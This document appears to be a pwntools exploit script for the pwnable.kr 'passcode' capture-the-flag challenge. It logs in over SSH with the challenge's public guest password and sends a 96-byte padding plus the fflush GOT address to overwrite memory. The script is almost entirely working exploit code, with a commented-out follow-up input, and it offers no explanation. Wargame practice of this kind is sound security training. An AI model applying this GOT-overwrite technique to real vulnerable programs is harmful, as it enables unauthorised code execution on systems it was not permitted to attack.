# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
name = './passcode'
# r = process(name)
# ssh passcode@pwnable.kr -p2222 (pw:guest)
r = ssh('passcode', 'pwnable.kr', port=2222, password='guest')
# gdb.attach(r, """
# br *login+34
# br *login+60
# echo x/20wx $esp\\n
# echo x/wx $ebp\\n
# """);
# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

r.recvuntil("System 1.0 beta.\n")

fflush_got = binn.got["fflush"]
print("fflush_got: ", hex(fflush_got))
r.sendline("A"*96+p32(fflush_got))

# 0x45216,0x4526a ,0xf02a4,0xf1147
# r.sendline("134514135")

# print(str(r.proc.pid))
# #gdb.attach(r, "")

# print(str(r.proc.pid))

r.interactive()

